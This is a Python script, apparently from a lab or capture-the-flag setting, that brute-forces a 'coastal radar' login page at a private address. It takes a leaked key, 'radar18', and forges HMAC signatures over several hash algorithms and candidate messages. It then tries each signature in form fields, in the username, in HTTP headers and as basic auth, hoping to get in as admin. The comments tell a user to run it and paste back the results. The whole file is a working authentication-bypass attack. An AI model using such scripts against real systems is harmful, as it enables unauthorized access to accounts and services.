#!/usr/bin/env python3
# Coastal radar /login: test DISTINCT auth-delivery models (small & fast, prints progress).
# Key = radar18 (leaked). Where does the HMAC go? extra param / token-in-u / header / basic-auth.
# YOU run it; login attempts are not capped. Prints any non-"denied" response.
import hmac, hashlib, base64, urllib.request, urllib.parse, re, itertools, sys

LOGIN = "http://10.10.10.22:8448/login"
keys  = ["radar18", "radar"]
algos = {"sha256": hashlib.sha256, "sha1": hashlib.sha1, "md5": hashlib.md5, "sha512": hashlib.sha512}
msgs  = ["admin", "18", "admin18", "u=admin", "radar"]

def sig(k, m, h):  # hex
    return hmac.new(k.encode("latin1"), m.encode(), h).hexdigest()

def send(fields=None, headers=None):
    body = urllib.parse.urlencode(fields or {}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(LOGIN, data=body, headers=headers or {}), timeout=5)
        return r.getcode(), dict(r.getheaders()), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode(errors="replace")

def tail(b):
    m = re.search(r'RADAR CALIBRATION</p>(.*?)</div>', b, re.S)
    return (m.group(1) if m else b[:120]).strip()

seen=set(); hit=False; n=0
def shoot(tag, fields=None, headers=None):
    global hit, n
    n += 1
    if n % 40 == 0: print(f"  ...{n} tries", file=sys.stderr)
    code, hdrs, body = send(fields, headers)
    t = tail(body)
    if t != "denied" and (t[:50]) not in seen:
        seen.add(t[:50]); hit=True
        print(f"\n*** HIT {tag}\n    fields={fields} headers={headers}\n    [{code}] {t[:160]!r}")
        if hdrs.get("Set-Cookie"): print(f"    Set-Cookie: {hdrs['Set-Cookie']}")

for k in keys:
    for an, h in algos.items():
        for m in msgs:
            s = sig(k, m, h)
            # model A: extra signature parameter alongside u
            for pname in ("sig", "h", "hmac", "mac", "token", "signature"):
                shoot(f"paramA {pname} k={k} {an} m={m}", {"u": "admin", "p": "", pname: s})
                shoot(f"paramB {pname} k={k} {an} m={m}", {"u": "admin", pname: s})
            # model B: token carried in u
            for sep in ("|", ":", "."):
                shoot(f"u-token{sep} k={k} {an} m={m}", {"u": f"{m}{sep}{s}", "p": ""})
            # model C: p is hex sig of m (sanity, incl sha512)
            shoot(f"p=sig k={k} {an} m={m}", {"u": "admin", "p": s})
            # model D: HTTP header carries the sig
            for hn in ("X-Signature", "X-Sig", "X-Hmac", "X-Token", "Authorization"):
                shoot(f"hdr {hn} k={k} {an} m={m}", {"u": "admin"}, {hn: s})
            # model E: basic auth admin:sig
            basic = base64.b64encode(f"admin:{s}".encode()).decode()
            shoot(f"basic k={k} {an} m={m}", {}, {"Authorization": f"Basic {basic}"})
print("\ndone." + ("" if hit else " all denied — paste this; the signed value/placement is none of these."))
